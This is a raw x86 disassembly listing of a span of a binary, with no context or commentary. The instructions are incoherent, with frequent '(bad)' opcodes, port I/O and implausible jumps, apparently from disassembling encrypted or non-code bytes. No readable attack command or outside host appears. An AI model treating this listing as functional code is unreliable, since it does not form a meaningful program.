  4244bc:	ja     0x4244b7
  4244be:	xlat   BYTE PTR ds:[ebx]
  4244bf:	mov    al,0x80
  4244c1:	ja     0x424445
  4244c3:	xor    al,0x82
  4244c6:	push   ebx
  4244c7:	sub    dl,BYTE PTR [ebx-0x4]
  4244ca:	mov    dl,0x86
  4244cc:	or     al,0xb2
  4244ce:	mov    edx,0x63fdff29
  4244d3:	mov    al,ds:0x4d954c09
  4244d8:	dec    ebp
  4244d9:	dec    ebp
  4244da:	xor    BYTE PTR [edi-0x76],0x80
  4244de:	lock mov dl,BYTE PTR [ebx-0x4]
  4244e2:	push   ebx
  4244e3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4244e9:	sub    edi,edi
  4244eb:	mov    dl,0x63
  4244ed:	ja     0x4244e8
  4244ef:	xlat   BYTE PTR ds:[ebx]
  4244f0:	mov    al,0x80
  4244f2:	ja     0x42447f
  4244f4:	xor    al,0x8b
  4244f7:	push   ebx
  4244f8:	cld    
  4244f9:	push   ebx
  4244fa:	sub    dh,BYTE PTR [edx-0x454df37a]
  424500:	sub    edi,edi
  424502:	mov    dl,0x3a
  424504:	ja     0x42448c
  424506:	mov    esi,0x8d8d3aae
  42450b:	jl     0x424584
  42450d:	xchg   DWORD PTR [ecx+0x7c66f7ea],esi
  424513:	ja     0x4244dd
  424515:	fld    DWORD PTR [ebp-0x587f12e3]
  42451b:	mov    al,BYTE PTR [eax+0x4538a77]
  424521:	push   ebx
  424522:	jl     0x4244d6
  424524:	les    ecx,FWORD PTR [edx+esi*4]
  424527:	test   BYTE PTR [ecx],ch
  424529:	inc    DWORD PTR [edx-0x72c5e442]
  42452f:	lea    eax,[eax-0xf7f7589]
  424535:	mov    dl,BYTE PTR [ebx-0x4]
  424538:	push   ebx
  424539:	sub    dh,BYTE PTR [edx-0x454df37a]
  42453f:	sub    edi,edi
  424541:	mov    dl,0x50
  424543:	ja     0x4244cc
  424545:	xor    BYTE PTR [edi-0x76],0x80
  424549:	lock mov dl,BYTE PTR [ebx-0x4]
  42454d:	push   ebx
  42454e:	sub    dh,BYTE PTR [edx-0x454df37a]
  424554:	sub    edi,edi
  424556:	mov    dl,0x50
  424558:	ja     0x424522
  42455a:	xor    al,0x8a
  42455d:	xor    BYTE PTR [edi-0x76],0x53
  424561:	push   ecx
  424562:	push   ebx
  424563:	jl     0x424517
  424565:	test   BYTE PTR [ecx],ch
  424567:	mov    dl,0xbe
  424569:	or     al,0xff
  42456b:	std    
  42456c:	xor    BYTE PTR [edi+0x7a],0x63
  424570:	std    
  424571:	aad    0x6f
  424573:	sub    dh,0x1e
  424576:	push   eax
  424577:	ja     0x424500
  424579:	xor    BYTE PTR [edi-0x7c],0x80
  42457d:	out    dx,al
  42457e:	push   ds
  42457f:	push   eax
  424580:	ja     0x42454a
  424582:	xor    BYTE PTR [edi-0x76],0x80
  424586:	lock mov dl,BYTE PTR [ebx-0x4]
  42458a:	push   ebx
  42458b:	sub    dh,BYTE PTR [edx-0x794dd646]
  424591:	or     al,0xff
  424593:	mov    dl,0x80
  424595:	lock xchg DWORD PTR [ebx-0x4e],esp
  424599:	aad    0x55
  42459b:	xor    BYTE PTR [edi-0x76],0x80
  42459f:	lock mov dl,BYTE PTR [ebx+0x2a]
  4245a3:	push   ebx
  4245a4:	cld    
  4245a5:	mov    dl,0xba
  4245a7:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4245ad:	xor    al,0x87
  4245b0:	mov    dl,0xbe
  4245b2:	sub    esp,DWORD PTR [ebx-0x4e]
  4245b5:	aad    0x1d
  4245b7:	xor    al,0x87
  4245ba:	xor    BYTE PTR [edi+0x21],0x80
  4245be:	int    0x32
  4245c0:	cmp    cl,BYTE PTR [ebp+0x705c098d]
  4245c6:	xchg   esi,eax
  4245c7:	dec    ebp
  4245c8:	xlat   BYTE PTR ds:[ebx]
  4245c9:	stc    
  4245ca:	dec    ebp
  4245cb:	or     ch,bh
  4245cd:	les    ebx,FWORD PTR [edi]
  4245cf:	xor    BYTE PTR [edi-0x38],0xec
  4245d3:	ja     0x4245c4
  4245d5:	xor    al,0x21
  4245d8:	adc    BYTE PTR [eax+0x32],0x3a
  4245dc:	lea    ecx,[ebp+0xa0c6aed]
  4245e2:	dec    ebp
  4245e3:	xlat   BYTE PTR ds:[ebx]
  4245e4:	stc    
  4245e5:	dec    ebp
  4245e6:	xchg   esi,eax
  4245e7:	out    dx,eax
  4245e8:	push   eax
  4245e9:	ja     0x4245b3
  4245eb:	xor    BYTE PTR [edi-0x76],0x80
  4245ef:	lock mov dl,BYTE PTR [ebx-0x4]
  4245f3:	push   ebx
  4245f4:	sub    dh,BYTE PTR [edx-0x794dd646]
  4245fa:	or     al,0xff
  4245fc:	mov    dl,0x80
  4245fe:	lock enter 0xb263,0x80
  424603:	ja     0x424590
  424605:	xor    al,0x8b
  424608:	xlat   BYTE PTR ds:[ebx]
  424609:	push   cs
  42460a:	push   ebx
  42460b:	cld    
  42460c:	push   ebx
  42460d:	sub    dh,BYTE PTR [edx-0x454df37a]
  424613:	sub    edi,edi
  424615:	mov    dl,0x3a
  424617:	ja     0x42459f
  424619:	les    ebx,FWORD PTR ds:0xfc532a53
  42461f:	mov    dl,0xba
  424621:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424627:	xor    al,0xc8
  42462a:	or     DWORD PTR [edx],esp
  42462c:	mov    dl,0x80
  42462e:	lock test BYTE PTR [eax-0x12],dl
  424632:	and    BYTE PTR [eax-0xf7f7489],al
  424638:	mov    edx,DWORD PTR [ebx-0x4]
  42463b:	push   ebx
  42463c:	sub    dh,BYTE PTR [edx-0x454df37a]
  424642:	sub    edi,edi
  424644:	mov    dl,0xec
  424646:	add    BYTE PTR [eax-0xf7f7589],0x8a
  42464d:	push   ebx
  42464e:	sub    dl,BYTE PTR [ebx-0x4]
  424651:	mov    dl,0xba
  424653:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424659:	xor    al,0x84
  42465c:	pop    edi
  42465d:	out    dx,al
  42465e:	and    BYTE PTR [ecx],cl
  424660:	dec    edi
  424661:	adc    DWORD PTR ds:0x77804d4d,ecx
  424667:	xor    al,BYTE PTR [eax-0x4d92cd10]
  42466d:	xchg   BYTE PTR [ecx],ch
  42466f:	add    DWORD PTR [ecx],esp
  424671:	add    esi,ebp
  424673:	lea    ecx,[ebp-0x7f4d0073]
  424679:	lock not DWORD PTR [edi-0xa]
  42467d:	and    al,0x6f
  42467f:	cmp    BYTE PTR [esi+0x4d4d8afe],bh
  424685:	xor    BYTE PTR [edi-0x76],0x80
  424689:	lock mov dl,BYTE PTR [ebx-0x4]
  42468d:	push   ebx
  42468e:	sub    dh,BYTE PTR [edx-0x454df37a]
  424694:	sub    edi,edi
  424696:	mov    dl,0x5f
  424698:	ja     0x424620
  42469a:	xlat   BYTE PTR ds:[ebx]
  42469b:	out    dx,eax
  42469c:	xor    BYTE PTR [edi-0x75],0x80
  4246a0:	lock mov eax,esp
  4246a3:	outs   dx,DWORD PTR ds:[esi]
  4246a4:	xor    BYTE PTR [edi-0x76],0x80
  4246a8:	lock mov dl,BYTE PTR [ebx+0x2a]
  4246ac:	push   ebx
  4246ad:	cld    
  4246ae:	stos   DWORD PTR es:[edi],eax
  4246af:	mov    dl,0xba
  4246b1:	sub    DWORD PTR [edx-0x56f37a],esi
  4246b7:	mov    dl,0xa3
  4246b9:	jo     0x4246b6
  4246bb:	out    dx,eax
  4246bc:	lea    edx,[edi-0x78127880]
  4246c2:	xor    eax,0xf68a777c
  4246c7:	and    al,0x6f
  4246c9:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  4246cd:	cmc    
  4246ce:	and    al,0x6f
  4246d0:	cmp    BYTE PTR [eax+0x77502177],al
  4246d6:	and    DWORD PTR [ecx+0x77806a80],ebx
  4246dc:	mov    al,BYTE PTR [eax+0xde28a97]
  4246e2:	pusha  
  4246e3:	and    ah,BYTE PTR [edi+ebp*2]
  4246e6:	cmp    BYTE PTR [ebx-0x4e],dl
  4246e9:	test   eax,0xf8b27e53
  4246ee:	sub    DWORD PTR [edx-0x400f37a],esi
  4246f4:	adc    BYTE PTR [edi+0x9f763ef],0xf
  4246fb:	loopne 0x424737
  4246fd:	lea    ecx,[ebp-0x7f108880]
  424703:	xchg   edi,eax
  424704:	out    dx,eax
  424705:	in     al,dx
  424706:	or     ah,BYTE PTR [ebp-0x65]
  424709:	push   eax
  42470a:	xchg   edi,eax
  42470b:	enter  0x777c,0x8b
  42470f:	icebp  
  424710:	and    al,0x6f
  424712:	cmp    BYTE PTR [eax-0x687f7489],al
  424718:	mov    edx,DWORD PTR [ebx+0x7e]
  42471b:	mov    dl,0xf8
  42471d:	sub    DWORD PTR [ebx-0x4e],edx
  424720:	mov    dl,0x86
  424722:	or     al,0xff
  424724:	sti    
  424725:	adc    BYTE PTR [edi-0x75187f76],0x53
  42472c:	mov    dh,0x53
  42472e:	or     eax,0xb229bcb2
  424733:	pop    es
  424734:	or     al,0xff
  424736:	pushf  
  424737:	and    bh,0xc8
  42473a:	pop    edi
  42473b:	xchg   ebp,eax
  42473c:	jl     0x42471b
  42473e:	or     DWORD PTR [edi],ecx
  424740:	mov    bl,0x3a
  424742:	lea    ecx,[ebp-0x7f376880]
  424748:	ja     0x424739
  42474a:	in     al,dx
  42474b:	jmp    0x9780:0x8d8d8d2e
  424752:	out    dx,eax
  424753:	and    bh,0xc8
  424756:	inc    ebx
  424757:	fwait
  424758:	push   ebp
  424759:	and    bh,0x8a
  42475c:	xchg   ebx,eax
  42475d:	and    BYTE PTR [edi+0x53cb538a],0x4
  424764:	mov    dl,0x61
  424766:	or     al,0xb2
  424768:	mov    ah,0x29
  42476a:	inc    DWORD PTR [esi]
  42476c:	push   eax
  42476d:	xchg   edi,eax
  42476e:	and    DWORD PTR [ebx-0x64],0x9
  424772:	jns    0x80cfd4b2
  424778:	xchg   edi,eax
  424779:	mov    al,BYTE PTR [eax-0x49ac7519]
  42477f:	push   ebx
  424780:	or     eax,0xb20c07b2
  424785:	mov    esp,0x509cff29
  42478a:	xchg   edi,eax
  42478b:	xor    bh,BYTE PTR [edi+esi*2+0x21]
  42478f:	repz and al,0x6f
  424792:	cmp    BYTE PTR [eax-0x187f7569],al
  424798:	mov    dl,BYTE PTR [ebx-0x4a]
  42479b:	push   ebx
  42479c:	or     eax,0xb20c07b2
  4247a1:	mov    esp,0xbe9cff29
  4247a6:	add    eax,0x808d8d8d
  4247ab:	xchg   edi,eax
  4247ac:	mov    al,BYTE PTR [eax+0xbed8ad7]
  4247b2:	or     eax,0x2b2b653
  4247b7:	sub    DWORD PTR [edx+0x7eff0c07],esi
  4247bd:	add    ebx,edx
  4247bf:	mov    esi,DWORD PTR [esi+0x97e6388]
  4247c5:	in     eax,dx
  4247c6:	jmp    0x43cfd558
  4247cb:	ret    0xe501
  4247ce:	or     ch,bh
  4247d0:	push   eax
  4247d1:	xlat   BYTE PTR ds:[ebx]
  4247d2:	stc    
  4247d3:	or     DWORD PTR [ebx+ebx*1-0x5e],ebx
  4247d7:	clc    
  4247d8:	dec    ebp
  4247d9:	or     DWORD PTR [ebp-0x7868af73],ecx
  4247df:	adc    BYTE PTR [edi-0x7f8e1379],0xd7
  4247e6:	xchg   esp,ebp
  4247e8:	xor    DWORD PTR [edx+0x2b22907],0x9c2ff0c
  4247f2:	pop    esp
  4247f3:	sbb    esi,DWORD PTR [edx+0xba22107]
  4247f9:	mul    BYTE PTR [edi+ebp*2]
  4247fc:	cmp    BYTE PTR [eax-0x29],dl
  4247ff:	xchg   DWORD PTR [eax-0x69],edx
  424802:	xchg   BYTE PTR [eax-0x287f7869],al
  424808:	xchg   DWORD PTR [ebx-0x4a],edx
  42480b:	in     eax,dx
  42480c:	or     ecx,DWORD PTR ds:0xb20c07b2
  424812:	add    ch,BYTE PTR [ecx]
  424814:	(bad)  
  424815:	jle    0x424803
  424817:	xchg   edi,eax
  424818:	out    dx,eax
  424819:	push   eax
  42481a:	xchg   edi,eax
  42481b:	xchg   DWORD PTR [eax-0x287fde69],eax
  424821:	and    DWORD PTR [ebx-0x4a],edx
  424824:	in     eax,dx
  424825:	or     ecx,DWORD PTR ds:0xb22902b2
  42482b:	pop    es
  42482c:	or     al,0xff
  42482e:	jle    0x4247b0
  424830:	xlat   BYTE PTR ds:[ebx]
  424831:	xchg   BYTE PTR [ebx-0x3e],ah
  424834:	xlat   BYTE PTR ds:[ebx]
  424835:	rol    BYTE PTR [eax-0x287fde69],0x21
  42483c:	push   ebx
  42483d:	mov    dh,0xed
  42483f:	or     ecx,DWORD PTR ds:0xb22902b2
  424845:	pop    es
  424846:	or     al,0xff
  424848:	jle    0x4247ca
  42484a:	xlat   BYTE PTR ds:[ebx]
  42484b:	xchg   BYTE PTR [ebx-0x3e],ah
  42484e:	xlat   BYTE PTR ds:[ebx]
  42484f:	out    dx,eax
  424850:	adc    BYTE PTR [edi-0x7c287f79],0x3a
  424857:	aam    0xed
  424859:	jl     0x424867
  42485b:	dec    ebp
  42485c:	lock stc 
  42485e:	or     DWORD PTR [edi+0x12],ecx
  424861:	dec    ebp
  424862:	dec    ebp
  424863:	dec    ebp
  424864:	cmp    ah,BYTE PTR [edi-0x74687fce]
  42486a:	adc    bh,0x8b
  42486d:	push   ebx
  42486e:	mov    dh,0xed
  424870:	or     ecx,DWORD PTR ds:0xb22902b2
  424876:	pop    es
  424877:	or     al,0xff
  424879:	jle    0x4247fb
  42487b:	xlat   BYTE PTR ds:[ebx]
  42487c:	xor    al,BYTE PTR [eax-0x2a9c3719]
  424882:	pushf  
  424883:	in     eax,0xd3
  424885:	sub    eax,0x808a9780
  42488a:	xlat   BYTE PTR ds:[ebx]
  42488b:	mov    dl,BYTE PTR [ebx-0x4a]
  42488e:	in     eax,dx
  42488f:	or     ecx,DWORD PTR ds:0xb20c07b2
  424895:	add    ch,BYTE PTR [ecx]
  424897:	in     al,dx
  424898:	je     0x424899
  42489a:	jle    0x42481c
  42489c:	popf   
  42489d:	out    dx,al
  42489e:	arpl   WORD PTR [ebx],ax
  4248a0:	or     DWORD PTR [edi-0x12],ecx
  4248a3:	dec    ebp
  4248a4:	dec    ebp
  4248a5:	dec    ebp
  4248a6:	mov    ds:0x53847780,eax
  4248ab:	mov    dl,0x80
  4248ad:	lock test ch,ch
  4248b0:	add    eax,0xa6c4ab0d
  4248b5:	xor    BYTE PTR [edi-0x76],0x53
  4248b9:	mov    dl,0x80
  4248bb:	lock mov dl,BYTE PTR [ebx+0x51]
  4248bf:	mov    dl,0xba
  4248c1:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4248c7:	test   eax,0x8deffb70
  4248cc:	xchg   edi,eax
  4248cd:	add    BYTE PTR [edi-0x7285785e],0x8d
  4248d4:	lea    edi,[edi+esi*2-0x76]
  4248d8:	mul    BYTE PTR [edi+ebp*2]
  4248db:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  4248df:	cmc    
  4248e0:	and    al,0x6f
  4248e2:	cmp    BYTE PTR [eax-0xf7f7589],al
  4248e8:	mov    bl,BYTE PTR [ecx-0x5f21d65]
  4248ee:	and    ah,BYTE PTR [edi+ebp*2]
  4248f1:	cmp    BYTE PTR [ebx-0x4],dl
  4248f4:	mov    dl,0x86
  4248f6:	or     al,0xae
  4248f8:	push   ebx
  4248f9:	(bad)  
  4248fa:	mov    dl,0xba
  4248fc:	sub    edi,edi
  4248fe:	mov    dl,0x50
  424900:	ja     0x424886
  424902:	xor    BYTE PTR [edi-0x76],0x80
  424906:	lock mov dl,BYTE PTR [ebx-0x4]
  42490a:	mov    dl,0x86
  42490c:	or     al,0x53
  42490e:	(bad)  
  42490f:	mov    dl,0xba
  424911:	sub    edi,edi
  424913:	mov    dl,0x50
  424915:	ja     0x42490e
  424917:	and    bh,0x25
  42491a:	xor    BYTE PTR [edi-0x79],0x80
  42491e:	lock xchg DWORD PTR [ebx-0x4e],edx
  424922:	push   eax
  424923:	ja     0x4248ac
  424925:	mov    ds:0xa3f68777,al
  42492a:	outs   dx,DWORD PTR ds:[esi]
  42492b:	cmp    BYTE PTR [eax-0xf7f3789],al
  424931:	enter  0xb253,0x50
  424935:	ja     0x4248ff
  424937:	mov    ds:0xe9f6c877,al
  42493c:	outs   dx,DWORD PTR ds:[esi]
  42493d:	cmp    BYTE PTR [eax-0xf7fcd89],al
  424943:	xor    dl,BYTE PTR [ebx-0x4e]
  424946:	push   eax
  424947:	ja     0x42497b
  424949:	mov    ds:0x24fa3277,al
  42494e:	outs   dx,DWORD PTR ds:[esi]
  42494f:	cmp    BYTE PTR [eax-0xf7f0689],al
  424955:	stc    
  424956:	push   ebx
  424957:	mov    dl,0x50
  424959:	ja     0x424954
  42495b:	mov    ds:0x24f6f977,al
  424960:	out    dx,al
  424961:	cmp    BYTE PTR [edi+esi*2+0x25],bh
  424965:	jmp    0x807ad62c
  42496a:	ja     0x42495b
  42496c:	dec    edi
  42496d:	push   0x9
  42496f:	movd   mm5,DWORD PTR [edi]
  424972:	lea    ecx,[ebp+0x4f217780]
  424978:	push   0x9
  42497a:	(bad)  
  42497c:	das    
  42497d:	lea    ecx,[ebp+0x4f1d7780]
  424983:	push   0x9
  424985:	mov    db5,edi
  424988:	lea    ecx,[ebp-0x7fda8880]
  42498e:	ja     0x4249b5
  424990:	xor    al,0xef
  424993:	mov    dl,0x86
  424995:	or     al,0x57
  424997:	(bad)  
  424998:	hlt    
  424999:	lea    ecx,[ebp+0x93a5fb9]
  42499f:	dec    edi
  4249a0:	cmp    ch,BYTE PTR [edi]
  4249a2:	lea    ecx,[ebp-0x7f758880]
  4249a8:	lock mov dl,BYTE PTR [ebx-0x4]
  4249ac:	mov    dl,0x86
  4249ae:	or     al,0x53
  4249b0:	(bad)  
  4249b1:	mov    dl,0xba
  4249b3:	sub    edi,edi
  4249b5:	mov    dl,0x50
  4249b7:	ja     0x4249b0
  4249b9:	xor    BYTE PTR [edi-0x76],0x80
  4249bd:	ja     0x424949
  4249bf:	xor    BYTE PTR [edi-0x11],0x80
  4249c3:	lock out dx,eax
  4249c5:	in     al,dx
  4249c6:	jge    0x424a2d
  4249c8:	adc    BYTE PTR [edx+0x25f0500a],0x4f
  4249cf:	push   0x9
  4249d1:	cvtpi2ps xmm5,mm6
  4249d4:	lea    ecx,[ebp-0x9858884]
  4249da:	and    al,0x79
  4249dc:	cmp    BYTE PTR [eax-0x7f6c8589],al
  4249e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249e3:	jp     0x424a38
  4249e5:	cld    
  4249e6:	push   ebx
  4249e7:	add    esi,DWORD PTR [edx-0x4b4df37a]
  4249ed:	sub    edi,edi
  4249ef:	adc    BYTE PTR [eax-0x59],0x7a
  4249f3:	xor    BYTE PTR [edi-0x76],0x80
  4249f7:	ja     0x424983
  4249f9:	or     dh,0x2e
  4249fc:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  424a02:	stos   BYTE PTR es:[edi],al
  424a03:	gs in  al,dx
  424a05:	jno    0x424987
  424a07:	ja     0x424993
  424a09:	xor    BYTE PTR [edi-0x76],0x80
  424a0d:	into   
  424a0e:	cmp    cl,BYTE PTR es:[ebp+0x501d808d]
  424a15:	xchg   edi,eax
  424a16:	and    DWORD PTR [ebx-0x5c],esp
  424a19:	xlat   BYTE PTR ds:[ebx]
  424a1a:	imul   eax,DWORD PTR [eax-0x317f3710],0x32
  424a21:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424a27:	stos   BYTE PTR es:[edi],al
  424a28:	adc    BYTE PTR [edi-0x12aeac38],0xc2
  424a2f:	or     eax,0xb20cbeb2
  424a34:	clc    
  424a35:	sub    edi,edi
  424a37:	mov    dh,0x80
  424a39:	lock and DWORD PTR [edx-0x6cf561b3],ebp
  424a40:	dec    ebp
  424a41:	or     ah,BYTE PTR ds:0x8021f080
  424a47:	xchg   edx,eax
  424a48:	xchg   ebp,eax
  424a49:	cmp    BYTE PTR [edi+0xa],0x43
  424a4d:	std    
  424a4e:	xchg   esi,eax
  424a4f:	in     al,dx
  424a50:	je     0x424a5c
  424a52:	xchg   BYTE PTR [ecx-0x7f727291],ah
  424a58:	lock and eax,0x3a36ce80
  424a5e:	lea    ecx,[ebp-0x61b2e2b0]
  424a64:	xchg   ebp,eax
  424a65:	dec    ebp
  424a66:	xlat   BYTE PTR ds:[ebx]
  424a67:	out    dx,eax
  424a68:	xchg   ebx,eax
  424a69:	xchg   BYTE PTR [edi-0x7f727212],ch
  424a6f:	xchg   ebx,eax
  424a70:	gs in  al,dx
  424a72:	xchg   esp,eax
  424a73:	or     DWORD PTR [eax+ebx*8+0x15],ebx
  424a77:	add    DWORD PTR [ebp+0x71],esi
  424a7a:	sbb    eax,0x801d7750
  424a7f:	ja     0x424a0b
  424a81:	xor    al,0x8a
  424a84:	push   ebx
  424a85:	cld    
  424a86:	in     eax,dx
  424a87:	add    eax,0x29bab20d
  424a8c:	mov    dl,0x86
  424a8e:	or     al,0xff
  424a90:	mov    dl,0x9
  424a92:	pop    esp
  424a93:	fisubr DWORD PTR [edi+0x50]
  424a96:	xchg   edi,eax
  424a97:	and    eax,0xf09fd63
  424a9c:	mov    esp,0x808d8d8d
  424aa1:	ja     0x424a2d
  424aa3:	xor    al,0x8a
  424aa6:	push   ebx
  424aa7:	cld    
  424aa8:	in     eax,dx
  424aa9:	add    eax,0x29bab20d
  424aae:	mov    dl,0x86
  424ab0:	or     al,0xff
  424ab2:	mov    dl,0x50
  424ab4:	ja     0x424a39
  424ab6:	xor    BYTE PTR [edi-0x75],0x80
  424aba:	lock mov ebp,ebp
  424abd:	add    eax,0xb2fc530d
  424ac2:	mov    edx,0xc86b229
  424ac7:	push   DWORD PTR [edx+0x6fda5c09]
  424acd:	inc    ebx
  424ace:	std    
  424acf:	pop    edi
  424ad0:	lock or DWORD PTR [ecx],0xffffffce
  424ad4:	and    cl,BYTE PTR [ebp-0xf7f7273]
  424ada:	sbb    eax,0x50efb2ed
  424adf:	lock sbb eax,0xf080ecc4
  424ae5:	sbb    eax,0x805dd880
  424aea:	push   cs
  424aeb:	push   eax
  424aec:	ja     0x424a70
  424aee:	jge    0x424b3f
  424af0:	not    ebp
  424af2:	xor    BYTE PTR [ebx-0x9],cl
  424af5:	xor    edi,ebx
  424af7:	in     al,dx
  424af8:	ja     0x424a7c
  424afa:	les    ecx,FWORD PTR [eax+eax*4]
  424afd:	sti    
  424afe:	or     al,BYTE PTR [eax+0x74ecee92]
  424b04:	or     al,BYTE PTR [esi-0x7272d05d]
  424b0a:	xor    BYTE PTR [edi+0x1d],0x80
  424b0e:	jge    0x424aff
  424b10:	push   eax
  424b11:	lock add BYTE PTR [eax-0x687f7510],0x8a
  424b19:	push   ebx
  424b1a:	push   ecx
  424b1b:	in     eax,dx
  424b1c:	ret    0xb20d
  424b1f:	mov    esi,0x29f8b20c
  424b24:	(bad)  
  424b25:	(bad)  
  424b26:	pop    edi
  424b27:	lock adc ch,0x1d
  424b2b:	xor    al,0xef
  424b2e:	in     al,dx
  424b2f:	jge    0x424b52
  424b31:	dec    ebp
  424b32:	xlat   BYTE PTR ds:[ebx]
  424b33:	add    BYTE PTR [eax-0x13691193],0x74
  424b3a:	or     al,BYTE PTR [esi-0x7272137b]
  424b40:	xor    BYTE PTR [edi+0x1d],0x80
  424b44:	lock mov eax,DWORD PTR [eax+0x51538b97]
  424b4b:	mov    dl,0xbe
  424b4d:	or     al,0xed
  424b4f:	ret    0xed0d
  424b52:	push   0x3d
  424b54:	mov    dl,0xf8
  424b56:	sub    edi,edi
  424b58:	(bad)  
  424b59:	cmp    dh,al
  424b5b:	add    DWORD PTR [eax+0x77502597],0x1d
  424b62:	xor    BYTE PTR [edi-0x75],0x80
  424b66:	lock mov ebp,ebp
  424b69:	add    eax,0xb2fc530d
  424b6e:	mov    edx,0xc86b229
  424b73:	push   DWORD PTR [edx+0x925f080]
  424b79:	pop    esp
  424b7a:	jg     0x424beb
  424b7c:	inc    ebx
  424b7d:	std    
  424b7e:	pop    edi
  424b7f:	lock or DWORD PTR [ecx],0x4c
  424b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b84:	dec    ebp
  424b85:	dec    ebp
  424b86:	dec    ebp
  424b87:	or     dh,0x26
  424b8a:	cmp    cl,BYTE PTR [ebp-0x28e29c73]
  424b90:	push   ebx
  424b91:	xor    al,0x32
  424b94:	or     dh,0x32
  424b97:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424b9d:	stos   BYTE PTR es:[edi],al
  424b9e:	adc    BYTE PTR [edi-0x12aeacce],0xc2
  424ba5:	or     eax,0xb20cbeb2
  424baa:	clc    
  424bab:	sub    edi,edi
  424bad:	mov    dh,0x80
  424baf:	lock and DWORD PTR [edx-0x6c6a61b3],ebp
  424bb6:	dec    ebp
  424bb7:	or     ah,BYTE PTR ds:0xf096a4f
  424bbd:	pushf  
  424bbe:	or     al,0x8d
  424bc0:	lea    eax,[eax-0x317fda69]
  424bc6:	cmp    BYTE PTR [edx],0x8d
  424bc9:	lea    eax,[eax+0x53fd808d]
  424bcf:	push   ecx
  424bd0:	in     eax,dx
  424bd1:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424bd7:	test   BYTE PTR [ecx],ch
  424bd9:	(bad)  
  424bda:	std    
  424bdb:	or     DWORD PTR [edi],ecx
  424bdd:	jb     0x424c19
  424bdf:	lea    ecx,[ebp-0x7f758880]
  424be5:	lock mov dl,BYTE PTR [ebx-0x4]
  424be9:	in     eax,dx
  424bea:	add    eax,0xc86b20d
  424bef:	mov    dl,0xba
  424bf1:	sub    edi,edi
  424bf3:	mov    dl,0x50
  424bf5:	ja     0x424b7d
  424bf7:	pop    esi
  424bf8:	imul   ebp,ecx,0x7d01386f
  424bfe:	test   BYTE PTR [eax-0x10],dl
  424c01:	pop    esi
  424c02:	push   eax
  424c03:	lock data16 jl 0x424c7e
  424c07:	inc    esi
  424c08:	sbb    ecx,ebp
  424c0a:	outs   dx,DWORD PTR ds:[esi]
  424c0b:	cmp    BYTE PTR [edi+esi*2+0x62],bh
  424c0f:	call   0x507abbfd
  424c14:	ja     0x424c6c
  424c16:	jl     0x424c8f
  424c18:	push   0xfffffff6
  424c1a:	and    al,0x6f
  424c1c:	cmp    BYTE PTR [ebx+0x70],dl
  424c1f:	adc    BYTE PTR [ebp+0x7b24601],0xc
  424c26:	mov    ds:0x8df4c4c2,al
  424c2b:	lea    edi,[ecx+0x75f01650]
  424c31:	dec    ebp
  424c32:	dec    ebp
  424c33:	dec    ebp
  424c34:	xchg   edx,eax
  424c35:	in     eax,dx
  424c36:	retf   
  424c37:	outs   dx,DWORD PTR ds:[esi]
  424c38:	in     al,0xb8
  424c3a:	pusha  
  424c3b:	mov    ecx,0x50386fe9
  424c40:	dec    edi
  424c41:	xchg   ebp,eax
  424c42:	dec    ebp
  424c43:	dec    ebp
  424c44:	dec    ebp
  424c45:	push   eax
  424c46:	dec    edi
  424c47:	mov    ebp,0x504d4d4d
  424c4c:	ja     0x424ca8
  424c4e:	push   eax
  424c4f:	ja     0x424c67
  424c51:	add    DWORD PTR [edx+0xa96018a],edx
  424c57:	push   eax
  424c58:	ja     0x424c88
  424c5a:	push   eax
  424c5b:	ja     0x424c93
  424c5d:	jl     0x424cae
  424c5f:	or     cl,BYTE PTR [ebp+0x4d]
  424c62:	dec    ebp
  424c63:	bnd jmp 0x19284d8
  424c69:	popf   
  424c6a:	dec    ebp
  424c6b:	dec    ebp
  424c6c:	dec    ebp
  424c6d:	push   eax
  424c6e:	sbb    BYTE PTR [ebp+0x7c4d4d4d],ah
  424c74:	dec    edi
  424c75:	lods   eax,DWORD PTR ds:[esi]
  424c76:	dec    ebp
  424c77:	dec    ebp
  424c78:	dec    ebp
  424c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c7a:	jmp    0x4fbe84ee
  424c7f:	mov    ch,0x4d
  424c81:	dec    ebp
  424c82:	dec    ebp
  424c83:	sbb    ecx,ebp
  424c85:	outs   dx,DWORD PTR ds:[esi]
  424c86:	cmp    BYTE PTR [edi+ecx*2-0x3b],bh
  424c8a:	dec    ebp
  424c8b:	dec    ebp
  424c8c:	dec    ebp
  424c8d:	icebp  
  424c8e:	jmp    0x4fbe8502
  424c93:	push   edx
  424c94:	dec    ebp
  424c95:	dec    ebp
  424c96:	dec    ebp
  424c97:	sbb    ecx,ebp
  424c99:	outs   dx,DWORD PTR ds:[esi]
  424c9a:	cmp    BYTE PTR [edi+ecx*2-0x2b],bh
  424c9e:	dec    ebp
  424c9f:	dec    ebp
  424ca0:	dec    ebp
  424ca1:	call   0x507abc8f
  424ca6:	add    ebp,ebx
  424ca8:	dec    ebp
  424ca9:	dec    ebp
  424caa:	dec    ebp
  424cab:	jl     0x424cfc
  424cad:	in     eax,0x4d
  424caf:	dec    ebp
  424cb0:	dec    ebp
  424cb1:	fucompp 
  424cb3:	outs   dx,DWORD PTR ds:[esi]
  424cb4:	cmp    BYTE PTR [eax-0x69],dl
  424cb7:	int    0x7c
  424cb9:	ja     0x424cca
  424cbb:	nop
  424cbc:	jmp    0xf0928530
  424cc1:	adc    BYTE PTR [edi+esi*2+0x41],bh
  424cc5:	cmc    
  424cc6:	jmp    0xf092853a
  424ccb:	push   ds
  424ccc:	jl     0x424d45
  424cce:	es (bad) 
  424cd0:	jmp    0x77be8544
  424cd5:	mul    BYTE PTR ds:[edi+ebp*2]
  424cd9:	cmp    BYTE PTR [ebx+0x6a],dl
  424cdc:	add    BYTE PTR [ecx+0x4f],0xa
  424ce0:	dec    ebp
  424ce1:	dec    ebp
  424ce2:	dec    ebp
  424ce3:	mov    dl,0xbe
  424ce5:	or     al,0xcd
